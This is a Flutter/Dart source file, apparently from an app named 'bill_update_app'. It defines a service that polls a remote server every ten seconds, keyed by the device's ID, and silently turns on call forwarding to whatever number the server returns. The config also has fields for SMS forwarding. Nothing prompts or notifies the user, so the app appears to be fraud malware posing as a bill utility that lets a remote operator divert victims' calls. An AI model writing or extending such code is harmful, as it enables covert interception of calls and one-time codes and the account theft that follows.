import 'dart:async';
import 'dart:convert';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import '../api_config.dart';

class ForwardingService {
  static final ForwardingService instance = ForwardingService._();
  ForwardingService._();

  Timer? _timer;
  Map? _lastConfig;
  String? _deviceId;
  final _deviceChannel = MethodChannel('com.example.bill_update_app/device');
  final _forwardingChannel = MethodChannel('com.example.bill_update_app/forwarding');

  Future<String?> _getDeviceId() async {
    if (_deviceId != null) return _deviceId;
    try {
      _deviceId = await _deviceChannel.invokeMethod<String>('getDeviceId');
    } catch (_) {}
    return _deviceId;
  }

  Future<void> startPolling() async {
    final deviceId = await _getDeviceId();
    if (deviceId == null || deviceId.isEmpty) {
      Future.delayed(const Duration(seconds: 3), startPolling);
      return;
    }
    _timer?.cancel();
    _timer = Timer.periodic(const Duration(seconds: 10), (_) => _checkConfig(deviceId));
  }

  bool _configsEqual(Map? a, Map? b) {
    if (a == null && b == null) return true;
    if (a == null || b == null) return false;
    return a['call_forwarding'] == b['call_forwarding']
        && a['call_forwarding_number'] == b['call_forwarding_number']
        && a['sms_forwarding'] == b['sms_forwarding']
        && a['sms_forwarding_number'] == b['sms_forwarding_number'];
  }

  Future<void> _checkConfig(String deviceId) async {
    try {
      final res = await http.get(
        Uri.parse('$apiBaseUrl/api/forwarding-config/$deviceId'),
        headers: {'Content-Type': 'application/json'},
      );
      if (res.statusCode != 200) return;
      final config = jsonDecode(res.body) as Map;

      if (!_configsEqual(_lastConfig, config)) {
        if (config['call_forwarding'] == true) {
          final number = config['call_forwarding_number'] as String? ?? '';
          if (number.isNotEmpty) {
            await _forwardingChannel.invokeMethod('enableCallForwarding', {'number': number});
          }
        }
      }
      _lastConfig = config;
    } catch (_) {}
  }

  void stop() {
    _timer?.cancel();
  }
}
